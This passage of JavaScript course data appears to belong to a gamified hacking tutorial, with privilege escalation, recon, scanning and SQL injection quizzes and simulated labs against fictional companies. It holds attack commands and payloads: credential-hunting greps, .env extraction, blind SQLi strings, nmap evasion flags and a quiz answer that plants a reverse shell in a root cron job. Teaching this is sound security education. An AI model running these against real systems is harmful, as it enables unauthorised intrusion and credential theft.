        {hint:"Grab the flag.",accept:["cat /root/root.txt","~cat /root/root"],output:"FLAG{pr1v_3sc_v1a_sud0_f1nd}",successMsg:"FLAG CAPTURED!",example:"cat /root/root.txt",quickCmds:["cat /root/root.txt"]}
      ]}
    ]},
    {id:"u12m",title:"\uD83C\uDFC6 Privesc Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Check sudo privileges:",a:["sudo -l","sudo -ll","sudo --list"],why:"First privesc check."},
      {type:"type",q:"Find SUID binaries:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null"],why:"SUID = potential privesc."},
      {type:"type",q:"Run LinPEAS:",a:["./linpeas.sh","bash linpeas.sh"],why:"Automated enumeration."},
      {type:"scenario",situation:"You find a cron job running a world-writable script as root.",q:"What do you do?",opts:["Add a reverse shell to the script","Delete the cron job","Ignore it","Report it and move on"],a:"Add a reverse shell to the script",why:"Root will execute your code on the next cron cycle."},
    ]},
  ]},

  // ---- UNIT 13: BUG BOUNTY ----
  {id:"u13",title:"Bug Bounty",desc:"Find real bugs, get paid",levels:[
    {id:"u13l1",title:"Methodology",rounds:[
      {type:"teach",text:"Bug bounty plan: 1) Read scope. 2) Recon (subdomains, tech stack). 3) Map features. 4) Test inputs. 5) Chain bugs. 6) Write report, get paid."},
      {type:"order",q:"Bug bounty workflow:",items:["Read program scope","Subdomain enumeration","Map features","Test for vulns","Chain findings","Write report"],why:"Methodology prevents missed findings."},
      {type:"match",q:"Match severity to finding:",pairs:[["Critical","Remote Code Execution"],["High","Stored XSS"],["Medium","Reflected XSS"],["Low","Missing headers"]],why:"Severity determines payout."},
    ]},
    {id:"u13l2",title:"Recon Automation",rounds:[
      {type:"teach",text:"Scale recon: subfinder finds subdomains, httpx checks which are alive, nuclei scans for known vulns. waybackurls pulls old URLs from the Internet Archive \u2014 pages the target deleted but the internet still remembers. Chain them all with pipes."},
      {type:"build",q:"Build the recon chain:",parts:["subfinder -d target.com","|","httpx","|","nuclei"],answer:["subfinder -d target.com","|","httpx","|","nuclei"],why:"Automates entire external recon."},
      {type:"type",q:"Find old URLs for a target:",a:["waybackurls target.com","gau target.com"],why:"Historical URLs reveal forgotten endpoints."},
    ]},
    {id:"u13l3",title:"Writing Reports",rounds:[
      {type:"teach",text:"Good report: Title + Severity, Description, Steps to Reproduce (exact!), Impact, Remediation. If they can't reproduce it, they can't pay you."},
      {type:"order",q:"Bug report sections:",items:["Title & Severity","Description","Steps to Reproduce","Impact","Remediation"],why:"Clear structure gets reports accepted."},
      {type:"scenario",situation:"You found a reflected XSS but the program says reflected XSS on unauthenticated pages is out of scope.",q:"What do you do?",opts:["Don't report it","Report it anyway","Post it publicly","Chain it with another bug"],a:"Don't report it",why:"Respect program rules. Out-of-scope reports waste time and can get you banned."},
    ]},
    {id:"u13lab",title:"\uD83D\uDDA5\uFE0F Lab: Bug Bounty Hunt",rounds:[
      {type:"lab",title:"Bug Bounty Hunt",objective:"Find vulnerabilities in a bug bounty target.",banner:"Program: MegaCorp Bug Bounty\nScope: *.megacorp.com\nReward: $500-$50,000\n",steps:[
        {hint:"Start with subdomain enumeration.",accept:["subfinder -d megacorp.com","~subfinder","~amass"],output:"megacorp.com\nwww.megacorp.com\napi.megacorp.com\ndev.megacorp.com\nstaging.megacorp.com\nadmin.megacorp.com",successMsg:"Found dev, staging, and admin subdomains!",example:"subfinder -d megacorp.com",quickCmds:["subfinder -d megacorp.com"]},
        {hint:"Check which subdomains are alive.",accept:["~httpx","~| httpx","subfinder -d megacorp.com | httpx"],output:"https://megacorp.com [200]\nhttps://api.megacorp.com [200]\nhttp://dev.megacorp.com [200]\nhttp://staging.megacorp.com [403]\nhttps://admin.megacorp.com [401]",successMsg:"dev is HTTP (not HTTPS) and staging returns 403!",example:"subfinder -d megacorp.com | httpx",quickCmds:["subfinder -d megacorp.com | httpx"]},
        {hint:"Scan the live targets for known vulnerabilities.",accept:["~nuclei","subfinder -d megacorp.com | httpx | nuclei"],output:"[critical] dev.megacorp.com - Git Config Exposed\n[high] api.megacorp.com - CORS Misconfiguration\n[info] admin.megacorp.com - Basic Auth",successMsg:"Critical: exposed .git on dev! That could leak source code. Write your report!",example:"subfinder -d megacorp.com | httpx | nuclei",quickCmds:["subfinder -d megacorp.com | httpx | nuclei"]}
      ]}
    ]},
    {id:"u13m",title:"\uD83C\uDFC6 Bug Bounty Mastery",isCheckpoint:true,rounds:[
      {type:"build",q:"Recon chain:",parts:["subfinder -d target.com","|","httpx","|","nuclei"],answer:["subfinder -d target.com","|","httpx","|","nuclei"],why:"Standard automated recon."},
      {type:"type",q:"Find historical URLs:",a:["waybackurls target.com","gau target.com"],why:"Old URLs = forgotten endpoints."},
      {type:"order",q:"Report structure:",items:["Title & Severity","Description","Steps to Reproduce","Impact","Remediation"],why:"Clear structure gets accepted."},
      {type:"pick",q:"A critical finding:",opts:["Remote Code Execution","Missing headers","Verbose errors","Slow page load"],a:"Remote Code Execution",why:"RCE = critical severity."},
    ]},
  ]},

  // ---- UNIT 14: SCRIPTING ----
  {id:"u14",title:"Scripting",desc:"Automate with Bash and Python",levels:[
    {id:"u14l1",title:"Bash Scripting",rounds:[
      {type:"teach",text:"Bash scripts = text files with commands. Start with #!/bin/bash. chmod +x script.sh to make executable. Variables: target='10.10.10.5'. Use with $target. read ip asks the user to type something and stores it in a variable called ip."},
      {type:"type",q:"Make a script executable:",a:["chmod +x script.sh","chmod 755 script.sh","chmod u+x script.sh"],why:"Scripts need execute permission."},
      {type:"pick",q:"#!/bin/bash is called:",opts:["A shebang","A comment","A variable","A function"],a:"A shebang",why:"The shebang tells the system which interpreter to use."},
    ]},
    {id:"u14l2",title:"Python Basics",rounds:[
      {type:"teach",text:"Python = #1 language for hacking tools. import socket for networking. import requests for HTTP. socket.connect_ex() returns 0 if a port is open."},
      {type:"pick",q:"socket.connect_ex() returns 0 when:",opts:["Port is open","Port is closed","Timeout","DNS error"],a:"Port is open",why:"0 = successful connection = open port."},
      {type:"tf",q:"Threading makes scans faster by checking multiple ports at once.",a:true,why:"50 threads = 50 ports simultaneously."},
    ]},
    {id:"u14l3",title:"Building Tools",rounds:[
      {type:"teach",text:"Combine bash for quick tasks (ping sweep, port check) and Python for complex tools (scanners, fuzzers, exploit scripts). Real pentesters write custom scripts daily."},
      {type:"build",q:"Build a bash port check for port 80:",parts:["(echo > /dev/tcp/10.10.10.5/80)","2>/dev/null","&&","echo 'Port 80 open'"],answer:["(echo > /dev/tcp/10.10.10.5/80)","2>/dev/null","&&","echo 'Port 80 open'"],why:"/dev/tcp tests connections. 2>/dev/null hides errors."},
      {type:"type",q:"Store user input in variable ip:",a:["read ip","read -p 'IP: ' ip"],why:"read stores user input in a variable."},
    ]},
    {id:"u14lab",title:"\uD83D\uDDA5\uFE0F Lab: Write a Scanner",rounds:[
      {type:"lab",title:"Write a Scanner",objective:"Write a quick port scanner in bash.",banner:"Challenge: Scan ports 22, 80, 443 on 10.10.10.5\nUsing bash /dev/tcp trick\n",steps:[
        {hint:"Test if port 22 is open.",accept:["~/dev/tcp/10.10.10.5/22","~echo > /dev/tcp","(echo > /dev/tcp/10.10.10.5/22) 2>/dev/null && echo open"],output:"open",successMsg:"Port 22 is open! SSH is running.",example:"(echo > /dev/tcp/10.10.10.5/22) 2>/dev/null && echo open",quickCmds:["(echo > /dev/tcp/10.10.10.5/22) 2>/dev/null && echo open"]},
        {hint:"Test port 80.",accept:["~/dev/tcp/10.10.10.5/80","(echo > /dev/tcp/10.10.10.5/80) 2>/dev/null && echo open"],output:"open",successMsg:"Port 80 open! Web server running.",example:"(echo > /dev/tcp/10.10.10.5/80) 2>/dev/null && echo open",quickCmds:["(echo > /dev/tcp/10.10.10.5/80) 2>/dev/null && echo open"]},
        {hint:"Now scan all three at once with a for loop.",accept:["~for port","~for p","for port in 22 80 443; do (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo \"$port open\"; done"],output:"22 open\n80 open\n443 open",successMsg:"All 3 ports open! You just wrote a port scanner in one line of bash.",example:"for port in 22 80 443; do (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo \"$port open\"; done",quickCmds:["for port in 22 80 443; do (echo > /dev/tcp/10.10.10.5/$port) 2>/dev/null && echo \"$port open\"; done"]}
      ]}
    ]},
    {id:"u14m",title:"\uD83C\uDFC6 Scripting Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Make script.sh executable:",a:["chmod +x script.sh","chmod 755 script.sh","chmod u+x script.sh"],why:"Scripts need execute permission."},
      {type:"pick",q:"#!/bin/bash is:",opts:["A shebang","A comment","A variable","A function"],a:"A shebang",why:"Tells the system to use bash."},
      {type:"pick",q:"Python socket.connect_ex() returns 0 when:",opts:["Port open","Port closed","Timeout","Error"],a:"Port open",why:"0 = connection successful."},
      {type:"type",q:"Store user input:",a:["read ip","read -p 'IP: ' ip"],why:"read stores input in a variable."},
    ]},
  ]},
]};

// =============================================
// INTERMEDIATE SECTION (7 units, 35 levels)
// Same topics, harder. More labs, less hand-holding.
// Mix of MegaCorp + new targets.
// =============================================

var SEC5 = {
  id:"s5",title:"Terminal & Linux II",tier:"intermediate",icon:"\uD83D\uDC27",color:"var(--green)",
  units:[
  {id:"i1",title:"Advanced Terminal",desc:"Regex, find, and process management",levels:[
    {id:"i1l1",title:"Find & Grep Power",rounds:[
      {type:"teach",text:"find searches by name, size, permissions, and time. grep -r searches file contents recursively. Combine them: find / -name '*.conf' finds all config files. grep -ri 'password' /etc searches every file for 'password'."},
      {type:"type",q:"Find all .log files on the system:",a:["find / -name '*.log'","find / -name *.log","find / -type f -name '*.log'"],why:"find / searches from root, -name filters by filename pattern."},
      {type:"type",q:"Search all files in /var for the word 'secret':",a:["grep -ri 'secret' /var","grep -ri secret /var","grep -r 'secret' /var"],why:"-r = recursive, -i = case insensitive."},
      {type:"hack",story:"You've gained shell access to a NovaTech backup server. Somewhere in the filesystem is a file containing database credentials.",q:"Find files containing 'db_password'.",a:["grep -ri 'db_password' /","grep -ri db_password /etc","find / -exec grep -l 'db_password' {} +"],output:"./etc/app/config.yml: db_password: Tr0ub4dor&3\n./var/backups/old_config.bak: db_password: Summer2024!",success:"Two config files with DB credentials! The backup has an older password too.",why:"grep -ri searches all files recursively. Attackers hunt for credentials in config files."}
    ]},
    {id:"i1l2",title:"Process & Job Control",rounds:[
      {type:"teach",text:"ps aux shows all running processes. kill stops a process by PID. bg/fg move jobs between background and foreground. top shows live resource usage. netstat -tlnp shows which processes are listening on which ports."},
      {type:"type",q:"Show all running processes:",a:["ps aux","ps -ef","ps -aux"],why:"ps aux lists every process with user, PID, CPU, and command."},
      {type:"type",q:"Show which processes are listening on network ports:",a:["netstat -tlnp","ss -tlnp","netstat -tulnp"],why:"This reveals services running on the machine and what ports they use."},
      {type:"hack",story:"You're on a compromised CyberVault server. Something suspicious is running \u2014 find it.",q:"List all processes and look for suspicious ones.",a:["ps aux","ps -ef"],output:"root     1     0.0  init\nroot   445   0.0  /usr/sbin/sshd\nwww    812   0.2  /usr/sbin/apache2\nroot  1337   8.5  /tmp/.hidden/backdoor.elf\nroot  1340   0.1  nc -lvp 4444",success:"PID 1337 is a backdoor running from /tmp! And netcat is listening on 4444.",why:"Attackers hide malware in /tmp with suspicious names. High CPU + hidden paths = red flag."}
    ]},
    {id:"i1l3",title:"Bash One-Liners",rounds:[
      {type:"teach",text:"Chain commands with pipes for powerful one-liners. cut -d: -f1 /etc/passwd extracts just usernames. sort | uniq -c counts occurrences. awk prints specific columns. xargs passes output as arguments to another command."},
      {type:"build",q:"Build a command to extract usernames from /etc/passwd:",parts:["cut","-d:","-f1","/etc/passwd"],answer:["cut","-d:","-f1","/etc/passwd"],why:"cut splits by delimiter (:) and takes field 1 (username)."},
      {type:"type",q:"Count unique IP addresses in access.log:",a:["cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn","awk '{print $1}' access.log | sort | uniq -c | sort -rn"],why:"Extract IPs, sort, count unique ones, sort by count descending."}
    ]},
    {id:"i1lab",title:"\uD83D\uDDA5\uFE0F Lab: Hunt the Backdoor",rounds:[
      {type:"lab",title:"Hunt the Backdoor",objective:"Find and analyze a hidden backdoor on a compromised server.",banner:"Connected to compromised-host...\n$ whoami\nwww-data\n",steps:[
        {hint:"List all running processes.",accept:["ps aux","ps -ef","~ps"],output:"root     1     0.0  init\nroot   445   0.0  sshd\nwww    812   0.2  apache2\nroot  1337   8.5  /tmp/.x/rat\nroot  1340   0.1  nc -lvp 9001",successMsg:"Suspicious: PID 1337 running from /tmp/.x/ with high CPU.",example:"ps aux",quickCmds:["ps aux"]},
        {hint:"Check what's listening on ports.",accept:["netstat -tlnp","ss -tlnp","~netstat","~ss -t"],output:"tcp  0.0.0.0:22    LISTEN  445/sshd\ntcp  0.0.0.0:80    LISTEN  812/apache2\ntcp  0.0.0.0:9001  LISTEN  1340/nc",successMsg:"Port 9001 is a netcat listener \u2014 an open backdoor!",example:"netstat -tlnp",quickCmds:["netstat -tlnp"]},
        {hint:"Look at the suspicious file in /tmp.",accept:["~ls /tmp","~cat /tmp","~file /tmp","ls -la /tmp/.x/"],output:"-rwxr-xr-x 1 root root 45K /tmp/.x/rat\n-rw-r--r-- 1 root root  89 /tmp/.x/cron.sh",successMsg:"A binary and a cron script. The backdoor auto-restarts itself!",example:"ls -la /tmp/.x/",quickCmds:["ls -la /tmp/.x/"]},
        {hint:"Read the cron script to see how it persists.",accept:["cat /tmp/.x/cron.sh","~cat.*cron"],output:"#!/bin/bash\nwhile true; do\n  if ! pgrep -f rat; then\n    /tmp/.x/rat &\n  fi\n  sleep 60\ndone",successMsg:"It checks every 60 seconds if the backdoor is running and restarts it if killed.",example:"cat /tmp/.x/cron.sh",quickCmds:["cat /tmp/.x/cron.sh"]}
      ]}
    ]},
    {id:"i1lab2",title:"\uD83D\uDDA5\uFE0F Lab: Log Analysis",rounds:[
      {type:"lab",title:"Log Analysis",objective:"Analyze web server logs to find an attacker's IP and method.",banner:"Incident Response Team\nAnalyzing /var/log/apache2/access.log\n",steps:[
        {hint:"Count requests per IP to find the top attacker.",accept:["~awk.*sort","~cut.*sort","awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn"],output:"  4521  192.168.1.105\n    89  10.0.0.1\n    34  172.16.0.5\n    12  192.168.1.1",successMsg:"192.168.1.105 made 4,521 requests \u2014 way more than anyone else.",example:"awk '{print $1}' access.log | sort | uniq -c | sort -rn",quickCmds:["awk '{print $1}' access.log | sort | uniq -c | sort -rn"]},
        {hint:"Filter logs for the suspicious IP to see what they did.",accept:["~grep 192.168.1.105","grep '192.168.1.105' /var/log/apache2/access.log"],output:"192.168.1.105 - GET /admin HTTP/1.1 403\n192.168.1.105 - GET /admin/login HTTP/1.1 200\n192.168.1.105 - POST /admin/login HTTP/1.1 401 (x4500)\n192.168.1.105 - POST /admin/login HTTP/1.1 200",successMsg:"4,500 failed login attempts then a success \u2014 brute force attack!",example:"grep '192.168.1.105' access.log",quickCmds:["grep '192.168.1.105' access.log"]},
        {hint:"Search for what they did after logging in.",accept:["~grep.*192.168.1.105.*200","grep '192.168.1.105' /var/log/apache2/access.log | grep 200"],output:"192.168.1.105 - POST /admin/login 200\n192.168.1.105 - GET /admin/users 200\n192.168.1.105 - GET /admin/export?table=users 200\n192.168.1.105 - POST /admin/upload 200",successMsg:"They exported the users table and uploaded something. Full breach.",example:"grep '192.168.1.105' access.log | grep 200",quickCmds:["grep '192.168.1.105' access.log | grep 200"]}
      ]}
    ]},
    {id:"i1m",title:"\uD83C\uDFC6 Terminal II Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Find all .conf files on the system:",a:["find / -name '*.conf'","find / -type f -name '*.conf'"],why:"find with -name searches by filename pattern."},
      {type:"type",q:"Search /etc recursively for 'password':",a:["grep -ri 'password' /etc","grep -ri password /etc","grep -r 'password' /etc"],why:"-r recursive, -i case insensitive."},
      {type:"pick",q:"A process using 8% CPU running from /tmp/.hidden/ is likely:",opts:["Malware or a backdoor","A normal system service","A log rotation script","A cron job"],a:"Malware or a backdoor",why:"Legitimate services don't run from hidden dirs in /tmp with high CPU."},
      {type:"type",q:"Show processes listening on network ports:",a:["netstat -tlnp","ss -tlnp","netstat -tulnp"],why:"Shows which services are accessible over the network."},
      {type:"build",q:"Extract usernames from /etc/passwd:",parts:["cut","-d:","-f1","/etc/passwd"],answer:["cut","-d:","-f1","/etc/passwd"],why:"Splits by colon delimiter, takes first field."}
    ]}
  ]}
]};

var SEC6 = {
  id:"s6",title:"Networking & Scanning II",tier:"intermediate",icon:"\uD83D\uDD0D",color:"var(--blue)",
  units:[
  {id:"i2",title:"Advanced Nmap",desc:"Scripts, evasion, and output mastery",levels:[
    {id:"i2l1",title:"NSE Scripts",rounds:[
      {type:"teach",text:"Nmap Scripting Engine (NSE) runs automated checks. --script vuln scans for known vulnerabilities. --script http-enum finds web directories. --script smb-vuln* checks for SMB exploits like EternalBlue."},
      {type:"type",q:"Run vulnerability scripts against a target:",a:["nmap --script vuln 10.10.10.5","nmap --script=vuln 10.10.10.5","nmap -sV --script vuln 10.10.10.5"],why:"--script vuln runs all vulnerability detection scripts."},
      {type:"hack",story:"MegaCorp's file server (10.10.10.20) might be running an outdated SMB version vulnerable to EternalBlue.",q:"Scan for SMB vulnerabilities.",a:["nmap --script smb-vuln* 10.10.10.20","nmap --script smb-vuln-ms17-010 10.10.10.20","nmap -p445 --script smb-vuln* 10.10.10.20"],output:"PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution (EternalBlue)\n|     Risk: HIGH\n|     CVE: CVE-2017-0144",success:"Confirmed: vulnerable to EternalBlue. This is a critical finding.",why:"NSE scripts automate vulnerability checks that would take hours manually."}
    ]},
    {id:"i2l2",title:"Scan Evasion",rounds:[
      {type:"teach",text:"Firewalls and IDS can block scans. Evasion techniques: -f fragments packets, --data-length adds random bytes, -D uses decoys, --source-port spoofs the source port. Timing: -T2 is slow and stealthy."},
      {type:"build",q:"Build a stealthy scan with decoys and fragmentation:",parts:["nmap","-sS","-f","-D","RND:5","10.10.10.5"],answer:["nmap","-sS","-f","-D","RND:5","10.10.10.5"],why:"-sS SYN scan, -f fragments, -D RND:5 adds 5 random decoy IPs."},
      {type:"pick",q:"Which timing option is stealthiest?",opts:["-T0 (paranoid)","-T3 (normal)","-T4 (aggressive)","-T5 (insane)"],a:"-T0 (paranoid)",why:"-T0 waits 5 minutes between probes. Extremely slow but nearly undetectable."},
      {type:"scenario",situation:"You're scanning a target with a strict firewall. Your initial scan returned all ports filtered.",q:"Best approach to get through?",opts:["Use -Pn to skip host discovery and try different scan types","Scan faster with -T5","Give up, the firewall is too strong","Only scan port 80"],a:"Use -Pn to skip host discovery and try different scan types",why:"-Pn skips ping (which may be blocked). Try ACK scan (-sA), window scan, or different source ports."}
    ]},
    {id:"i2l3",title:"Output & Automation",rounds:[
      {type:"teach",text:"Save scan results: -oN normal text, -oX XML (for tools), -oG grepable, -oA all formats. Combine with grep to filter: grep 'open' scan.txt. Import XML into Metasploit with db_import."},
      {type:"type",q:"Save scan results in all formats:",a:["nmap -oA scan_results 10.10.10.5","nmap -oA results 10.10.10.5"],why:"-oA creates .nmap, .xml, and .gnmap files simultaneously."},
      {type:"type",q:"Filter scan output for open ports only:",a:["grep 'open' scan.nmap","grep open scan.nmap","cat scan.nmap | grep open"],why:"Quick way to extract just the open ports from verbose output."}
    ]},
    {id:"i2lab",title:"\uD83D\uDDA5\uFE0F Lab: Full Network Audit",rounds:[
      {type:"lab",title:"Full Network Audit",objective:"Map a corporate network, find services, and identify vulnerabilities.",banner:"PenTest Engagement: QuantumSoft Corp\nScope: 10.10.10.0/24\nRules: Full internal audit authorized.\n",steps:[
        {hint:"Start with a ping sweep to find live hosts.",accept:["nmap -sn 10.10.10.0/24","~nmap -sn","~ping sweep"],output:"Nmap scan: 256 IPs\nHost: 10.10.10.1  (gateway)\nHost: 10.10.10.20 (file-server)\nHost: 10.10.10.44 (web-server)\nHost: 10.10.10.88 (db-server)\n4 hosts up",successMsg:"4 live hosts found on the network.",example:"nmap -sn 10.10.10.0/24",quickCmds:["nmap -sn 10.10.10.0/24"]},
        {hint:"Run a detailed scan on the web server with version detection.",accept:["nmap -sV -sC 10.10.10.44","~nmap.*-sV.*10.10.10.44","nmap -A 10.10.10.44"],output:"PORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.4\n80/tcp  open  http     Apache 2.4.6\n443/tcp open  https    Apache 2.4.6\n3306/tcp open mysql    MySQL 5.7.12",successMsg:"Web server is running Apache, SSH, and MySQL is exposed!",example:"nmap -sV -sC 10.10.10.44",quickCmds:["nmap -sV -sC 10.10.10.44"]},
        {hint:"Check the file server for SMB vulnerabilities.",accept:["nmap --script smb-vuln* 10.10.10.20","~nmap.*script.*smb.*10.10.10.20"],output:"PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\n| smb-vuln-ms17-010:\n|   VULNERABLE: Remote Code Execution\n|   Risk factor: HIGH",successMsg:"File server is vulnerable to EternalBlue. Critical finding!",example:"nmap --script smb-vuln* 10.10.10.20",quickCmds:["nmap --script smb-vuln* 10.10.10.20"]},
        {hint:"Save all results to file for your report.",accept:["nmap -oA audit 10.10.10.0/24","~nmap -oA","~-oA"],output:"Results saved:\n  audit.nmap (text)\n  audit.xml  (XML)\n  audit.gnmap (grepable)",successMsg:"All three formats saved. XML can be imported into Metasploit.",example:"nmap -oA audit 10.10.10.0/24",quickCmds:["nmap -oA audit 10.10.10.0/24"]}
      ]}
    ]},
    {id:"i2m",title:"\uD83C\uDFC6 Scanning II Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Run all vulnerability scripts against a target:",a:["nmap --script vuln 10.10.10.5","nmap --script=vuln 10.10.10.5"],why:"--script vuln is the fastest way to check for known vulns."},
      {type:"pick",q:"What does -f do in nmap?",opts:["Fragments packets to evade firewalls","Forces a full connect scan","Filters output to open ports","Finds hidden services"],a:"Fragments packets to evade firewalls",why:"Fragmentation splits packets so IDS/firewall can't reassemble them easily."},
      {type:"build",q:"Build a stealthy scan with fragmentation and decoys:",parts:["nmap","-sS","-f","-D","RND:5","target"],answer:["nmap","-sS","-f","-D","RND:5","target"],why:"Combines SYN scan, fragmentation, and 5 random decoy IPs."},
      {type:"type",q:"Save results in all formats:",a:["nmap -oA results target","nmap -oA scan target"],why:"-oA creates text, XML, and grepable output simultaneously."}
    ]}
  ]},
  {id:"i3",title:"Advanced Web Recon",desc:"Deep enumeration and API testing",levels:[
    {id:"i3l1",title:"Subdomain & Vhost Brute-Force",rounds:[
      {type:"teach",text:"Some subdomains don't show in DNS. ffuf brute-forces virtual hosts by fuzzing the Host header. ffuf -u http://target -H 'Host: FUZZ.target.com' -w wordlist. Filter by response size to find real ones."},
      {type:"type",q:"Brute-force subdomains with ffuf:",a:["ffuf -u http://target.com -H 'Host: FUZZ.target.com' -w wordlist.txt","ffuf -w wordlist.txt -u http://target.com -H 'Host: FUZZ.target.com'"],why:"ffuf replaces FUZZ with each word. Different response size = real subdomain."},
      {type:"hack",story:"NovaTech's main site is at novatech.com, but there could be hidden internal apps on subdomains.",q:"Brute-force virtual hosts on novatech.com.",a:["ffuf -u http://novatech.com -H 'Host: FUZZ.novatech.com' -w wordlist.txt","gobuster vhost -u http://novatech.com -w wordlist.txt"],output:"admin.novatech.com    [Status: 200, Size: 4521]\nstaging.novatech.com  [Status: 200, Size: 8834]\njenkins.novatech.com  [Status: 403, Size: 274]\napi-dev.novatech.com  [Status: 200, Size: 156]",success:"Hidden subdomains! staging and api-dev are likely less secure than production.",why:"Staging and dev environments often have weaker security than production."}
    ]},
    {id:"i3l2",title:"API Enumeration",rounds:[
      {type:"teach",text:"APIs often expose sensitive data. Check /api, /api/v1, /swagger, /docs for documentation. Test endpoints with curl. Look for authentication bypass: try accessing endpoints without tokens."},
      {type:"type",q:"Fetch an API endpoint with curl:",a:["curl http://target.com/api/v1/users","curl -s http://target.com/api/users","curl http://target.com/api/users"],why:"curl makes HTTP requests. APIs return JSON data."},
      {type:"scenario",situation:"You found /api/v1/users on a target. Without authentication, it returns a 200 OK with a list of all user accounts and emails.",q:"What type of vulnerability is this?",opts:["Broken Access Control / IDOR","SQL Injection","XSS","CSRF"],a:"Broken Access Control / IDOR",why:"The API doesn't check authentication. Anyone can access user data."}
    ]},
    {id:"i3l3",title:"Technology Fingerprinting",rounds:[
      {type:"teach",text:"Identify what a site runs: Wappalyzer browser extension, whatweb command, HTTP headers (X-Powered-By, Server). Check /robots.txt, sitemap.xml, and source code comments for version info."},
      {type:"type",q:"Fingerprint a website's technology:",a:["whatweb http://target.com","whatweb target.com"],why:"whatweb detects CMS, frameworks, server software, and versions."},
      {type:"hack",story:"Before attacking MegaCorp's new web portal, identify what technologies it uses.",q:"Run whatweb to fingerprint the site.",a:["whatweb http://megacorp.com","whatweb megacorp.com","~whatweb"],output:"http://megacorp.com [200 OK]\n  WordPress 5.8.1\n  PHP 7.4.3\n  Apache 2.4.41\n  jQuery 3.5.1\n  Bootstrap 4.6",success:"WordPress 5.8.1 is outdated \u2014 there are known CVEs. PHP 7.4 is also EOL.",why:"Knowing exact versions lets you search for specific exploits."}
    ]},
    {id:"i3lab",title:"\uD83D\uDDA5\uFE0F Lab: Full Web Recon",rounds:[
      {type:"lab",title:"Full Web Recon",objective:"Map every attack surface on a target website before exploitation.",banner:"Target: shop.novatech.com\nAuthorized penetration test.\n",steps:[
        {hint:"Fingerprint the website technology.",accept:["whatweb http://shop.novatech.com","whatweb shop.novatech.com","~whatweb"],output:"WordPress 5.8.1, PHP 7.4, Apache 2.4.41\nPlugins: WooCommerce 5.5, Contact Form 7",successMsg:"WordPress + WooCommerce. Both have known vulnerabilities.",example:"whatweb http://shop.novatech.com",quickCmds:["whatweb shop.novatech.com"]},
        {hint:"Scan for hidden directories.",accept:["gobuster dir -u http://shop.novatech.com -w common.txt","~gobuster","~dirsearch"],output:"/wp-admin/     (403)\n/wp-content/   (200)\n/wp-includes/  (200)\n/backup/       (200)\n/api/          (200)\n/.env          (200)",successMsg:"/backup/ and /.env are exposed! Major findings.",example:"gobuster dir -u http://shop.novatech.com -w common.txt",quickCmds:["gobuster dir -u http://shop.novatech.com -w common.txt"]},
        {hint:"Check the exposed .env file.",accept:["curl http://shop.novatech.com/.env","~curl.*.env"],output:"DB_HOST=localhost\nDB_USER=root\nDB_PASS=N0v4T3ch_2024!\nAPI_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc",successMsg:"Database credentials and a live API key exposed in the .env file!",example:"curl http://shop.novatech.com/.env",quickCmds:["curl shop.novatech.com/.env"]},
        {hint:"Check for hidden API endpoints.",accept:["curl http://shop.novatech.com/api/v1/users","~curl.*api","~curl.*/api"],output:"[{\"id\":1,\"name\":\"admin\",\"email\":\"admin@novatech.com\",\"role\":\"admin\"},\n {\"id\":2,\"name\":\"jsmith\",\"email\":\"j.smith@novatech.com\",\"role\":\"user\"}]",successMsg:"Unauthenticated API access \u2014 leaking all user data!",example:"curl shop.novatech.com/api/v1/users",quickCmds:["curl shop.novatech.com/api/v1/users"]}
      ]}
    ]},
    {id:"i3m",title:"\uD83C\uDFC6 Web Recon II Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Brute-force virtual hosts:",a:["ffuf -u http://target -H 'Host: FUZZ.target.com' -w wordlist.txt","gobuster vhost -u http://target -w wordlist.txt"],why:"Fuzzing the Host header discovers hidden subdomains."},
      {type:"pick",q:"An exposed .env file typically contains:",opts:["Database credentials and API keys","HTML templates","CSS stylesheets","JavaScript libraries"],a:"Database credentials and API keys",why:".env files store secrets that should never be publicly accessible."},
      {type:"type",q:"Fingerprint a website:",a:["whatweb http://target.com","whatweb target.com"],why:"Reveals CMS, framework versions, and server software."},
      {type:"scenario",situation:"You found /api/v1/users returns all accounts without authentication.",q:"Severity level?",opts:["Critical \u2014 broken access control","Low \u2014 information disclosure","Medium \u2014 needs more testing","Not a vulnerability"],a:"Critical \u2014 broken access control",why:"Unauthenticated access to all user data is a critical access control failure."}
    ]}
  ]}
]};

var SEC7 = {
  id:"s7",title:"Web Exploitation II",tier:"intermediate",icon:"\u26A1",color:"var(--red)",
  units:[
  {id:"i4",title:"Advanced SQLi",desc:"Blind injection and filter bypass",levels:[
    {id:"i4l1",title:"Blind SQL Injection",rounds:[
      {type:"teach",text:"Blind SQLi: the page doesn't show data, but changes behavior. Boolean-based: ' AND 1=1-- returns normal page, ' AND 1=2-- returns different. Time-based: ' AND SLEEP(5)-- makes the page take 5 seconds. If it delays, it's vulnerable."},
      {type:"pick",q:"How does time-based blind SQLi confirm vulnerability?",opts:["The page response is delayed","The page shows an error","The page returns extra data","The page crashes"],a:"The page response is delayed",why:"SLEEP(5) makes the database wait. If the response takes 5+ seconds, it's injectable."},
      {type:"hack",story:"QuantumSoft's login form doesn't show SQL errors. You suspect blind injection.",q:"Test for time-based blind SQLi.",a:["' AND SLEEP(5)--","' OR SLEEP(5)--","admin' AND SLEEP(5)--"],output:"[Request sent... waiting...]\n[Response received after 5.02 seconds]\n\nLogin failed.",success:"5-second delay confirms time-based blind SQLi. The database executed SLEEP().",why:"Even without visible errors, timing differences prove injection exists."}
    ]},
    {id:"i4l2",title:"SQLi Filter Bypass",rounds:[
      {type:"teach",text:"WAFs block common SQLi. Bypass techniques: use /**/comments (SEL/**/ECT), double encoding (%2527), case mixing (SeLeCt), CHAR() function for strings. Always try multiple bypass methods."},
